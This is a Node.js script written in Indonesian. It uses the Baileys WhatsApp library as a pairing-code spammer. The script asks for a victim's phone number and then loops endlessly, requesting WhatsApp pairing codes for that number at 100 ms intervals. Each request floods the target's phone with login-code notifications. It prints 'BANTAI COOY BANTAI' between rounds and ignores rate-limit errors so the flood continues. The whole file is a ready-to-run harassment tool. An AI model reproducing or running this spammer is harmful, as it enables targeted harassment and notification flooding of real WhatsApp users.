const pino = require("pino");
const {
  Boom
} = require("@hapi/boom");
const fs = require('fs');
const chalk = require("chalk");
const FileType = require("file-type");
const path = require('path');
const axios = require("axios");
const _ = require("lodash");
const moment = require("moment-timezone");
const PhoneNumber = require("awesome-phonenumber");
const {
  default: spamConnect,
  delay,
  makeCacheableSignalKeyStore,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateForwardMessageContent,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  generateMessageID,
  downloadContentFromMessage,
  makeInMemoryStore,
  jidDecode,
  proto,
  Browsers
} = require("@whiskeysockets/baileys");
const NodeCache = require("node-cache");
const readline = require("readline");
const makeWASocket = require("@whiskeysockets/baileys")['default'];

const store = makeInMemoryStore({
  'logger': pino().child({
    'level': "silent",
    'stream': "store"
  })
});

const MCC_CODES = {
  "62": "Indonesia",
  "1": "USA",
  "91": "India",
  // Tambahkan kode MCC lainnya sesuai kebutuhan
};

const pairingCode = true || process.argv.includes("--pairing-code");
const useMobile = process.argv.includes("--mobile");
const rl = readline.createInterface({
  'input': process.stdin,
  'output': process.stdout
});
const question = text => new Promise(resolve => rl.question(text, resolve));

async function startspam() {
  let { version, isLatest } = await fetchLatestBaileysVersion();
  const { state, saveCreds } = await useMultiFileAuthState("./reyhan_anti_eror");
  const msgRetryCounterCache = new NodeCache();
  const spam = makeWASocket({
    'logger': pino({ 'level': "silent" }),
    'printQRInTerminal': !pairingCode,
    'browser': Browsers.windows("Firefox"),
    'auth': {
      'creds': state.creds,
      'keys': makeCacheableSignalKeyStore(state.keys, pino().child({ 'level': "fatal" }))
    },
    'markOnlineOnConnect': true,
    'generateHighQualityLinkPreview': true,
    'getMessage': async key => {
      if (store) {
        const msg = await store.loadMessage(key.remoteJid, key.id);
        return msg.message || undefined;
      }
      return { 'conversation': "SPAM PAIRING WAIT" };
    },
    'msgRetryCounterCache': msgRetryCounterCache,
    'defaultQueryTimeoutMs': undefined
  });

  store.bind(spam.ev);

  if (pairingCode && !spam.authState.creds.registered) {
    if (useMobile) {
      throw new Error("Tidak dapat menggunakan kode pasangan dengan API seluler");
    }

    console.log(chalk.bgBlack(chalk.yellowBright("Script By Reyhan6610")));
    let phoneNumber = await question(chalk.bgBlack(chalk.redBright("Silakan Masukan nomor WhatsApp\nContoh: +628xxx : ")));
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');

    while (!Object.keys(MCC_CODES).some(v => phoneNumber.startsWith(v))) {
      console.log(chalk.bgBlack(chalk.redBright("Masukkan Nomor Whatsapp : +62xxxx")));
      phoneNumber = await question(chalk.bgBlack(chalk.greenBright("Silakan ketik nomor WhatsApp\nContoh: +62xxxx : ")));
      phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
    }

    while (true) {
      let second = 100;
      while (second > 0) {
        let code = await spam.requestPairingCode(phoneNumber);
        code = code?.match(/.{1,4}/g)?.join('-') || code;
        console.log(chalk.bgBlack(chalk.greenBright("Pairing Code: " + code)));
        console.log(chalk.bgBlack(chalk.whiteBright("" + second + "")));
        await new Promise(resolve => setTimeout(resolve, 100));
        second--;
      }
      console.log(chalk.bgBlack(chalk.redBright("BANTAI COOY BANTAI")));
      await new Promise(resolve => setTimeout(resolve, 0));
    }
  }

  let file = require.resolve(__filename);
  fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(chalk.redBright("Update " + __filename));
    delete require.cache[file];
    require(file);
  });
}

startspam();

process.on("uncaughtexception", function (err) {
  let e = String(err);
  if (
    e.includes("conflict") ||
    e.includes("Socket connection timeout") ||
    e.includes("not-authorized") ||
    e.includes("already-exists") ||
    e.includes("rate-overlimit") ||
    e.includes("Connection Closed") ||
    e.includes("Timed Out") ||
    e.includes("Value not found")
  ) {
    return;
  }
  console.log("Caught exception: ", err);
});